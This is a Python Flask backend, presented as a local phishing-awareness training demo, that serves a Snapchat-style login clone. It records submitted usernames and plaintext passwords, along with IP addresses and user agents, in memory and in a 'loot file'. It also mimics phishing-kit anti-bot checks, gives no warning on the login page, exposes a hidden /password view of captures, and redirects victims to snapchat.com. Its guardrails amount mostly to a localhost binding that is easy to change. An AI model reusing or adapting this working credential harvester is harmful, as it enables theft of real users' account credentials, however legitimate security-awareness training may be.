"""
Phishing Awareness Demo — Flask backend
=======================================

A LOCAL-ONLY, clearly-labelled training simulation that teaches students how
credential-phishing pages work. It serves the existing Snapchat-style login
clone and logs form submissions into an in-memory dict, then shows the
submitter exactly what an attacker would have captured.

GUARDRAILS (part of the design — do not remove):
  * Binds to 127.0.0.1 only. Never expose this on a network.
  * No disclosure on the login page itself — the "this was a simulation"
    reveal happens the instant a student clicks Log In (deferred disclosure,
    like real simulated-phishing training).
  * Submissions are stored in memory AND appended to captured_credentials.txt
    (a local teaching artifact, git-ignored) so the instructor can show the
    class the "attacker's file".
  * No lookalike domain, no real service, no credential forwarding.

Run:
      pip install -r requirements.txt
      python app.py
Then open http://127.0.0.1:5000/login.html
"""

import re
import time
import uuid
from pathlib import Path

from flask import (
    Flask,
    redirect,
    render_template,
    request,
    send_from_directory,
    url_for,
)

app = Flask(__name__)

# Anchor to this file's directory so the app works no matter where it is
# launched from (not just from the project root).
BASE_DIR = Path(__file__).resolve().parent

# ---------------------------------------------------------------------------
# Demo configuration
# ---------------------------------------------------------------------------
MIN_USERNAME_LEN = 3   # matches the client-side rule in login.js
MIN_PASSWORD_LEN = 8   # matches the existing Snapchat-style rule
MAX_FIELD_LEN = 64
XHR_TOKEN = "demo-training-token-2026"  # stand-in for the anti-bot check

# In-memory "attacker database" — wiped on restart (demo only)
captures = {}


# ---------------------------------------------------------------------------
# Static pages — served from the existing folder, theme untouched
# ---------------------------------------------------------------------------
@app.route("/")
def index():
    return send_from_directory(str(BASE_DIR), "index.html")


@app.route("/index.html")
def index_html():
    return send_from_directory(str(BASE_DIR), "index.html")


@app.route("/Acconts.html")
def accounts():
    return send_from_directory(str(BASE_DIR), "Acconts.html")


@app.route("/login.html")
def login_page():
    return send_from_directory(str(BASE_DIR), "login.html")


@app.route("/css/<path:filename>")
def css(filename):
    return send_from_directory("css", filename)


@app.route("/js/<path:filename>")
def js(filename):
    return send_from_directory("js", filename)


@app.route("/img/<path:filename>")
def img(filename):
    return send_from_directory("img", filename)


# ---------------------------------------------------------------------------
# Helpers (server-side validation)
# ---------------------------------------------------------------------------
def _clean(value):
    """Normalise whitespace; None -> ''."""
    if value is None:
        return ""
    return re.sub(r"\s+", " ", value).strip()


def _looks_clean(value):
    """Reject obvious junk: control characters or oversized input."""
    if len(value) > MAX_FIELD_LEN:
        return False
    if any(ord(ch) < 32 for ch in value):
        return False
    return True


# ---------------------------------------------------------------------------
# Login handler
# ---------------------------------------------------------------------------
@app.route("/login", methods=["POST"])
def login():
    # 1) Anti-bot marker check. Real phishing kits set a hidden field and/or
    #    an X-Requested-With header so naive crawlers are skipped. This demo
    #    mirrors that behaviour — if the marker is missing, reject the request.
    #    Note: a plain HTML form cannot set the X-Requested-With header (only
    #    AJAX can), so the hidden field is the path students will actually
    #    exercise; the header check is kept for completeness.
    hidden_ok = request.form.get("xrw", "") == XHR_TOKEN
    header_ok = request.headers.get("X-Requested-With") == "XMLHttpRequest"
    if not (hidden_ok or header_ok):
        return redirect(url_for("login_page", error="1"))

    username = _clean(request.form.get("name", ""))
    password = request.form.get("message", "")

    # 2) Minimal server-side validation (the client check can be bypassed).
    if (
        len(username) < MIN_USERNAME_LEN
        or not _looks_clean(username)
        or len(password) < MIN_PASSWORD_LEN
        or not _looks_clean(password)
    ):
        return redirect(url_for("login_page", error="1"))

    # 3) Demo "harvest": store in the in-memory dict.
    entry_id = uuid.uuid4().hex[:8]
    captures[entry_id] = {
        "username": username,
        "password": password,
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "ip": request.remote_addr,
        "user_agent": (request.headers.get("User-Agent") or "")[:120],
    }

    # 3b) Append to the instructor's "loot file" — a plaintext .txt that
    #     looks exactly like a real attacker's harvested-credentials file.
    #     Local teaching artifact only; never commit it (see .gitignore).
    try:
        with open(BASE_DIR / "captured_credentials.txt", "a", encoding="utf-8") as f:
            f.write(
                "[{t}] user={u} | pass={p} | ip={ip} | ua={ua}\n".format(
                    t=captures[entry_id]["time"],
                    u=username,
                    p=password,
                    ip=captures[entry_id]["ip"],
                    ua=captures[entry_id]["user_agent"],
                )
            )
    except OSError as exc:
        # Never crash the demo over file I/O, but log it so the instructor
        # knows if the loot file could not be written.
        app.logger.warning("Could not write capture file: %s", exc)

    # 4) Send the victim through the realistic login round-trip:
    #    fake "Logging you in…" screen -> educational reveal -> snapchat.com.
    return redirect(url_for("processing", entry_id=entry_id))


# ---------------------------------------------------------------------------
# Fake login screen (the round-trip delay real logins have)
# ---------------------------------------------------------------------------
@app.route("/processing/<entry_id>")
def processing(entry_id):
    if entry_id not in captures:
        return redirect(url_for("login_page"))
    return render_template("processing.html", entry_id=entry_id)


# ---------------------------------------------------------------------------
# Educational reveal — what an attacker captured
# ---------------------------------------------------------------------------
@app.route("/debrief/<entry_id>")
def debrief(entry_id):
    entry = captures.get(entry_id)
    if entry is None:
        return redirect(url_for("login_page"))
    return render_template("debrief.html", entry=entry, entry_id=entry_id)


# ---------------------------------------------------------------------------
# Instructor views (localhost only) — /password is the "hidden" one
# ---------------------------------------------------------------------------
@app.route("/captures")
@app.route("/password")
def view_captures():
    if request.remote_addr not in ("127.0.0.1", "::1"):
        return "Forbidden — localhost only", 403
    return render_template("captures.html", captures=captures)


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
